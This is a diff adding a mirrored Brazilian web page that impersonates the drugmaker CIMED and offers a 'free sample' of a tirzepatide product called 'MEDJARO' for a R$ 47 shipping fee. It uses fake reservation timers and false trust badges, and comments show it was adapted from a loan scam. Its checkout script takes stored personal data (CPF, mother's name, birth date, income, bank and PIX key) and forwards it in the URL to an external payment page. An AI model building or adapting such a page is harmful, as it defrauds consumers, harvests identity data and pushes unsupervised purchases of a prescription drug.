@@ -1,0 +1,980 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<!-- Mirrored from liberadoagora.digital/10.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 12 Feb 2026 02:40:58 GMT -->
+
+<head>
+  <meta charset="UTF-8">
+  <!-- Meta Pixel Code -->
+  <script>
+    !function (f, b, e, v, n, t, s) {
+      if (f.fbq) return; n = f.fbq = function () {
+        n.callMethod ?
+          n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+      };
+      if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
+      n.queue = []; t = b.createElement(e); t.async = !0;
+      t.src = v; s = b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t, s)
+    }(window, document, 'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1598836378125085');
+    fbq('track', 'PageView');
+  </script>
+  <noscript><img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=1598836378125085&ev=PageView&noscript=1" /></noscript>
+  <!-- End Meta Pixel Code -->
+
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids
+    async defer></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+  <link rel="stylesheet" href="css/fluid.css">
+  <title>Última Etapa - Liberação Imediata | Credfácil</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&amp;display=swap"
+    rel="stylesheet">
+  <style>
+    :root {
+      --green-primary: #FFC600;
+      --green-dark: #cc9e00;
+      --green-darker: #997700;
+      --green-light: #fff9c4;
+      --bg: #f8f9fa;
+      --card: #fff;
+      --text: #1f2937;
+      --text-light: #6b7280;
+      --success: #16a34a;
+      --success-bg: #f0fdf4;
+      --warning: #f59e0b;
+      --warning-bg: #fffbeb;
+      --radius: 16px;
+      --shadow-lg: 0 8px 32px rgba(0, 0, 0, 0.08);
+      font-family: 'Poppins', sans-serif;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background: linear-gradient(135deg, var(--bg) 0%, #e2e8f0 100%);
+      color: var(--text);
+      -webkit-font-smoothing: antialiased;
+      min-height: 100vh;
+      padding-top: 72px;
+    }
+
+    /* HEADER */
+    /* HEADER */
+    header.header {
+      background: linear-gradient(135deg, #ffcf33, #e6b200);
+      /* Yellow Gradient */
+      padding: 16px 0;
+      position: fixed;
+      top: 0;
+      width: 100%;
+      z-index: 1000;
+      box-shadow: 0 2px 16px rgba(0, 0, 0, 0.1);
+      backdrop-filter: blur(10px);
+    }
+
+    .header-content {
+      padding: 0 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      max-width: 550px;
+      margin: 0 auto;
+    }
+
+    .logo-white {
+      height: 40px;
+      filter: brightness(0) invert(1);
+    }
+
+    .user-info {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      gap: 2px;
+    }
+
+    .user-name {
+      font-size: 13px;
+      font-weight: 600;
+      color: white;
+      max-width: 150px;
+      text-overflow: ellipsis;
+      overflow: hidden;
+      white-space: nowrap;
+    }
+
+    .user-cpf {
+      font-size: 11px;
+      color: rgba(255, 255, 255, 0.85);
+    }
+
+    .user-icon-wrapper {
+      width: 40px;
+      height: 40px;
+      background: rgba(255, 255, 255, 0.15);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 2px solid rgba(255, 255, 255, 0.25);
+    }
+
+    .user-icon-wrapper svg {
+      width: 20px;
+      height: 20px;
+      color: white;
+    }
+
+    .header-right {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    /* Main */
+    .main-container {
+      min-height: calc(100vh - 150px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 520px;
+      background: var(--card);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow-lg);
+      padding: 28px 24px;
+      border: 1px solid rgba(29, 196, 99, 0.08);
+    }
+
+    /* Status Badge */
+    .status-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: var(--success-bg);
+      color: var(--success);
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 700;
+      margin-bottom: 16px;
+      text-transform: uppercase;
+      letter-spacing: 0.3px;
+    }
+
+    .status-badge svg {
+      width: 14px;
+      height: 14px;
+    }
+
+    /* Title */
+    .page-title {
+      font-size: 1.4rem;
+      font-weight: 800;
+      color: var(--text);
+      margin-bottom: 8px;
+      line-height: 1.3;
+    }
+
+    .highlight {
+      color: var(--green-primary);
+    }
+
+    .page-subtitle {
+      color: var(--text-light);
+      font-size: 0.95rem;
+      margin-bottom: 20px;
+      font-weight: 500;
+    }
+
+    /* Approved Card */
+    .approved-card {
+      background: linear-gradient(135deg, var(--green-light), #fff9c4);
+      border: 2px solid #e6b200;
+      border-radius: 12px;
+      padding: 20px;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .approved-label {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 0.85rem;
+      color: #166534;
+      font-weight: 600;
+      margin-bottom: 8px;
+      text-transform: uppercase;
+      letter-spacing: 0.3px;
+    }
+
+    .approved-label svg {
+      width: 18px;
+      height: 18px;
+      color: #000;
+    }
+
+    .approved-amount {
+      font-size: 2.2rem;
+      font-weight: 800;
+      color: #000;
+      margin-bottom: 6px;
+    }
+
+    .approved-installments {
+      font-size: 1rem;
+      font-weight: 600;
+      color: #166534;
+    }
+
+    /* Timer */
+    .timer-bar {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      padding: 12px 16px;
+      background: #fffbeb;
+      border: 1px solid rgba(245, 158, 11, 0.3);
+      border-radius: 10px;
+      margin-bottom: 20px;
+    }
+
+    .timer-icon {
+      width: 20px;
+      height: 20px;
+      color: var(--warning);
+    }
+
+    .timer-text {
+      font-size: 0.85rem;
+      font-weight: 600;
+      color: #92400e;
+    }
+
+    .timer-value {
+      font-size: 1rem;
+      font-weight: 800;
+      color: #b45309;
+      font-family: 'Courier New', monospace;
+    }
+
+    /* Insurance Section */
+    .insurance-section {
+      background: #f8fafc;
+      border: 1px solid #e2e8f0;
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 20px;
+    }
+
+    .insurance-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 14px;
+    }
+
+    .insurance-icon-box {
+      width: 40px;
+      height: 40px;
+      min-width: 40px;
+      background: linear-gradient(135deg, #FFC600, #e6b200);
+
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .insurance-icon-box svg {
+      width: 22px;
+      height: 22px;
+      color: #000;
+    }
+
+
+
+    .insurance-title {
+      font-size: 1rem;
+      font-weight: 700;
+      color: var(--text);
+    }
+
+    .insurance-subtitle {
+      font-size: 0.8rem;
+      color: var(--text-light);
+      font-weight: 500;
+    }
+
+    .insurance-features {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+
+    .insurance-features li {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 8px 0;
+      font-size: 0.85rem;
+      color: var(--text);
+      font-weight: 500;
+      border-bottom: 1px solid #e5e7eb;
+    }
+
+    .insurance-features li:last-child {
+      border-bottom: none;
+    }
+
+    .feature-check {
+      width: 20px;
+      height: 20px;
+      min-width: 20px;
+      background: #16a34a;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .feature-check svg {
+      width: 12px;
+      height: 12px;
+      color: white;
+    }
+
+    /* Pricing */
+    .pricing-card {
+      background: white;
+      border: 2px solid #FFC600;
+      border-radius: 12px;
+      padding: 18px;
+      margin-bottom: 20px;
+    }
+
+    .pricing-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 0;
+      border-bottom: 1px solid #f3f4f6;
+      font-size: 0.9rem;
+    }
+
+    .pricing-row:last-child {
+      border-bottom: none;
+      padding-top: 14px;
+      margin-top: 6px;
+      border-top: 2px solid #FFC600;
+    }
+
+    .pricing-label {
+      color: var(--text-light);
+      font-weight: 500;
+    }
+
+    .pricing-value {
+      font-weight: 600;
+      color: var(--text);
+    }
+
+    .pricing-row.total .pricing-label,
+    .pricing-row.total .pricing-value {
+      font-size: 1.1rem;
+      font-weight: 800;
+      color: #000;
+    }
+
+    /* CTA Button */
+    .cta-button {
+      width: 100%;
+      background: linear-gradient(135deg, #FFC600, #e6b200);
+
+      color: #000;
+      border: none;
+      padding: 18px 24px;
+      border-radius: 12px;
+      font-size: 1.05rem;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: 'Poppins', sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
+      transition: all 0.3s ease;
+      margin-bottom: 16px;
+    }
+
+    .cta-button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 32px rgba(29, 196, 99, 0.4);
+    }
+
+    .cta-button:active {
+      transform: translateY(0);
+    }
+
+    .cta-button svg {
+      width: 22px;
+      height: 22px;
+    }
+
+    .cta-button .spinner {
+      width: 22px;
+      height: 22px;
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-top: 3px solid white;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    /* Trust */
+    .trust-bar {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 12px;
+      background: #f8fafc;
+      border-radius: 8px;
+      margin-bottom: 16px;
+    }
+
+    .trust-bar svg {
+      width: 16px;
+      height: 16px;
+      color: var(--success);
+    }
+
+    .trust-bar span {
+      font-size: 0.8rem;
+      color: var(--text-light);
+      font-weight: 600;
+    }
+
+    /* Info Text */
+    .info-text {
+      text-align: center;
+      font-size: 0.8rem;
+      color: var(--text-light);
+      line-height: 1.6;
+    }
+
+    /* Modal */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      z-index: 2000;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      backdrop-filter: blur(4px);
+    }
+
+    .modal-overlay.show {
+      display: flex;
+    }
+
+    .modal-content {
+      background: white;
+      border-radius: 16px;
+      padding: 28px 24px;
+      max-width: 380px;
+      width: 100%;
+      text-align: center;
+      animation: modalPop 0.3s ease;
+    }
+
+    @keyframes modalPop {
+      from {
+        opacity: 0;
+        transform: scale(0.9);
+      }
+
+      to {
+        opacity: 1;
+        transform: scale(1);
+      }
+    }
+
+    .modal-icon {
+      width: 56px;
+      height: 56px;
+      background: var(--success-bg);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 16px;
+    }
+
+    .modal-icon svg {
+      width: 28px;
+      height: 28px;
+      color: var(--success);
+    }
+
+    .modal-title {
+      font-size: 1.2rem;
+      font-weight: 700;
+      color: var(--text);
+      margin-bottom: 12px;
+    }
+
+    .modal-message {
+      font-size: 0.9rem;
+      color: var(--text-light);
+      line-height: 1.6;
+      margin-bottom: 20px;
+    }
+
+    .modal-highlight {
+      color: var(--green-primary);
+      font-weight: 700;
+    }
+
+    .modal-button {
+      width: 100%;
+      background: linear-gradient(135deg, #FFC600, #e6b200);
+
+      color: #000;
+      border: none;
+      padding: 14px 20px;
+      border-radius: 10px;
+      font-size: 0.95rem;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: 'Poppins', sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .modal-button svg {
+      width: 18px;
+      height: 18px;
+    }
+
+    /* Footer */
+    footer.site-footer {
+      margin-top: auto;
+      background: linear-gradient(135deg, #FFC600, #e6b200);
+
+      color: #1f2937;
+      padding: 22px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .footer-inner {
+      max-width: 550px;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .footer-logo {
+      width: 40px;
+      filter: brightness(0) invert(1);
+    }
+
+    footer small {
+      font-size: 11px;
+      opacity: 0.95;
+      text-align: center;
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        padding: 24px 20px;
+      }
+
+      .page-title {
+        font-size: 1.25rem;
+      }
+
+      .approved-amount {
+        font-size: 1.9rem;
+      }
+
+      .cta-button {
+        padding: 16px 20px;
+        font-size: 1rem;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <header class="header">
+    <div class="header-content" style="justify-content: center;">
+      <img src="https://i.ibb.co/dwZp5wrP/logo-cimed.png" alt="CIMED" class="logo-white">
+    </div>
+  </header>
+
+  <div class="main-container">
+    <div class="container">
+      <!-- Status -->
+      <div class="status-badge" style="background-color: #d1fae5; color: #065f46;">
+        <svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+        </svg>
+        MEDJARO Reservada
+      </div>
+
+      <!-- Title -->
+      <h1 class="page-title">
+        Finalize sua <span class="highlight">Reserva do MEDJARO</span>
+      </h1>
+      <p class="page-subtitle">Última etapa para garantir o envio da sua amostra gratuita</p>
+
+      <!-- Approved Card (Modified for Confirmation) -->
+      <div class="approved-card">
+        <div class="approved-label">
+          <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z">
+            </path>
+          </svg>
+          SEU MEDJARO FOI CONFIRMADO
+        </div>
+        <div class="approved-installments" style="color: #000; font-size: 1.1rem; font-weight: 600;">Sua unidade está
+          temporariamente garantida</div>
+      </div>
+
+      <vturb-smartplayer id="vid-6997d7197d7b375b25e9f4e2"
+        style="display: block; margin: 0 auto; width: 100%; "></vturb-smartplayer>
+      <script
+        type="text/javascript"> var s = document.createElement("script"); s.src = "https://scripts.converteai.net/fda17d74-2c7a-478f-a73b-1199bf780a28/players/6997d7197d7b375b25e9f4e2/v4/player.js", s.async = !0, document.head.appendChild(s); </script>
+
+      <!-- Timer -->
+      <div class="timer-bar">
+        <svg class="timer-icon" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+        </svg>
+        <span class="timer-text">Sua reserva expira em:</span>
+        <span class="timer-value" id="timer">14:59</span>
+
+      </div>
+      <!-- CTA Button -->
+      <button class="cta-button" id="ctaButton2" onclick="handleCTA()">
+        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round"
+            d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z">
+          </path>
+        </svg>
+        Confirmar Frete e Garantir Meu MEDJARO
+      </button>
+
+      <script>
+        // Timer setup
+        let timeRemaining = 160;  // 2 minutes and 40 seconds in total (160 seconds)
+
+        const timerDisplay = document.getElementById("timer");
+        const ctaButton = document.getElementById("ctaButton2");
+
+        function updateTimer() {
+          // Calculate minutes and seconds
+          let minutes = Math.floor(timeRemaining / 60);
+          let seconds = timeRemaining % 60;
+
+          // Format the time as MM:SS
+          timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+
+          // If time is up, show the CTA button
+          if (timeRemaining === 0) {
+            ctaButton2.style.display = "block";  // Show the button
+          } else {
+            timeRemaining--;
+            ctaButton2.style.display = "none";
+          }
+        }
+
+        // Start the countdown
+        setInterval(updateTimer, 1000);  // Update every second
+      </script>
+      <!-- Info Section (Envio Medjaro) -->
+      <div class="insurance-section">
+        <div class="insurance-header">
+          <div class="insurance-icon-box">
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round"
+                d="M5 8h14M5 8a2 2 0 110-4h14a2 2 0 110 4M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8m-9 4h4">
+              </path>
+            </svg>
+          </div>
+          <div>
+            <div class="insurance-title">Envio do MEDJARO</div>
+            <div class="insurance-subtitle">Detalhes da sua amostra</div>
+          </div>
+        </div>
+
+        <ul class="insurance-features">
+          <li>
+            <span class="feature-check">
+              <svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+              </svg>
+            </span>
+            Amostra 100% gratuita
+          </li>
+          <li>
+            <span class="feature-check">
+              <svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+              </svg>
+            </span>
+            Pagamento apenas do frete refrigerado
+          </li>
+          <li>
+            <span class="feature-check">
+              <svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+              </svg>
+            </span>
+            Sem mensalidade ou cobrança futura
+          </li>
+          <li>
+            <span class="feature-check">
+              <svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+              </svg>
+            </span>
+            Produto enviado com embalagem térmica especial
+          </li>
+          <li>
+            <span class="feature-check">
+              <svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+              </svg>
+            </span>
+            Liberação imediata após confirmação
+          </li>
+        </ul>
+      </div>
+
+      <!-- Pricing -->
+      <div class="pricing-card">
+        <div class="pricing-row">
+          <span class="pricing-label">Frete refrigerado</span>
+          <span class="pricing-value">R$ 47,00</span>
+        </div>
+        <div class="pricing-row">
+          <span class="pricing-label">Taxas adicionais</span>
+          <span class="pricing-value">R$ 0,00</span>
+        </div>
+        <div class="pricing-row total">
+          <span class="pricing-label">Valor Total</span>
+          <span class="pricing-value">R$ 47,00</span>
+        </div>
+      </div>
+
+      <!-- CTA Button -->
+      <button class="cta-button" id="ctaButton" onclick="handleCTA()">
+        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round"
+            d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z">
+          </path>
+        </svg>
+        Confirmar Frete e Garantir Meu MEDJARO
+      </button>
+
+      <!-- Trust -->
+      <div class="trust-bar">
+        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round"
+            d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z">
+          </path>
+        </svg>
+        <span>Ambiente seguro e criptografado</span>
+      </div>
+
+      <!-- Info -->
+      <p class="info-text">
+        Após a confirmação do frete, seu código de rastreio será enviado por e-mail e SMS.
+      </p>
+    </div>
+  </div>
+
+  <!-- Modal (Not really used in flow logic usually if direct redirect, but updating text just in case) -->
+  <div class="modal-overlay" id="modal">
+    <div class="modal-content">
+      <div class="modal-icon">
+        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+        </svg>
+      </div>
+      <h3 class="modal-title">Quase lá!</h3>
+      <p class="modal-message">
+        Estamos redirecionando para o pagamento seguro do frete.<br><br>
+        Sua amostra será <span class="modal-highlight">enviada imediatamente</span> após a confirmação.
+      </p>
+      <button class="modal-button" onclick="redirectToCheckout()">
+        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M17 8l4 4m0 0l-4 4m4-4H3"></path>
+        </svg>
+        Ir para Pagamento
+      </button>
+    </div>
+  </div>
+
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <img src="https://i.ibb.co/dwZp5wrP/logo-cimed.png" alt="CIMED" class="footer-logo">
+      <small style="color: black;">© 2026 CIMED INDÚSTRIA S.A.<br>02.814.497/0001-07</small>
+    </div>
+  </footer>
+
+
+  <script>
+    // CTA Handler
+    function handleCTA() {
+      const btn = document.getElementById('ctaButton');
+      btn.innerHTML = '<div class="spinner"></div> Processando...';
+      btn.disabled = true;
+
+      setTimeout(() => {
+        // Direct redirect or show modal? 
+        // Showing modal to be consistent with previous flow, but updating text
+        btn.innerHTML = `
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
+            </svg>
+            Confirmar Frete e Garantir Meu MEDJARO
+          `;
+        btn.disabled = false;
+
+        // Directly call core logic or show modal
+        // Let's show modal for confirmation effect
+        document.getElementById('modal').classList.add('show');
+
+        // Or if user prefers direct:
+        // redirectToCheckout();
+      }, 800);
+    }
+
+
+
+    // Redirect
+    function redirectToCheckout() {
+      document.getElementById('modal').classList.remove('show');
+
+      const params = {};
+      const importantParams = [
+        'income', 'salaryDay', 'occupation', 'education', 'utm_source', 'utm_campaign',
+        'utm_medium', 'utm_content', 'utm_term', 'name', 'email', 'document', 'nome_mae',
+        'data_nasc', 'dueDate', 'telephone', 'telefone', 'cpf', 'nome', 'banco', 'chave_pix'
+      ];
+
+      importantParams.forEach(param => {
+        let value = localStorage.getItem(param);
+
+        if (value) {
+
+          // 🔥 Remove o 55 do início do telefone
+          if (param === 'telephone' || param === 'telefone') {
+            value = value.replace(/\D/g, ''); // remove caracteres não numéricos
+
+            if (value.startsWith('55')) {
+              value = value.substring(2);
+            }
+          }
+
+
+          if (param === 'cpf') params['document'] = value;
+          else params[param] = value;
+        }
+      });
+
+      const checkoutParams = new URLSearchParams(params);
+      window.location.href = `https://zuckpay.com.br/checkout/medjaro-tirzepatida-15mg?${checkoutParams.toString()}`;
+    }
+    document.addEventListener('DOMContentLoaded', function () {
+      // Load user data
+      function loadUserData() {
+        const nome = localStorage.getItem('nome');
+        if (nome) {
+          const nomes = nome.trim().split(' ');
+          const ultimoNome = nomes.length > 1 ? nomes[nomes.length - 1] : '';
+          document.getElementById('userName').textContent = ultimoNome ? `${nomes[0]} ${ultimoNome}` : nomes[0];
+        } else {
+          document.getElementById('userName').textContent = 'Usuário';
+        }
+
+        // Existing loan calculations removed as per request to change context to simple product shipping
+        if (document.getElementById('userCpf') && localStorage.getItem('cpf')) {
+          const cpf = localStorage.getItem('cpf');
+          const cpfLimpo = cpf.replace(/\D/g, '');
+          if (cpfLimpo.length === 11) {
+            document.getElementById('userCpf').textContent = `${cpfLimpo.substring(0, 3)}.***.***-${cpfLimpo.substring(9, 11)}`;
+          }
+        }
+      }
+
+      // Timer
+      function startTimer() {
+        let timeLeft = 15 * 60; // 15 minutes as requested (14:59 start)
+        const timerElement = document.getElementById('timer');
+
+        setInterval(() => {
+          if (timeLeft <= 0) {
+            timerElement.textContent = '00:00';
+            return;
+          }
+          timeLeft--;
+          const minutes = Math.floor(timeLeft / 60);
+          const seconds = timeLeft % 60;
+          timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }, 1000);
+      }
+
+
+      // Close modal on outside click
+      document.getElementById('modal').addEventListener('click', function (e) {
+        if (e.target === this) {
+          this.classList.remove('show');
+        }
+      });
+
+      // Init
+      loadUserData();
+      startTimer();
+    });
+  </script>
+
+
+</body>
+<!-- Mirrored from liberadoagora.digital/10.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 12 Feb 2026 02:41:00 GMT -->
+
+</html>
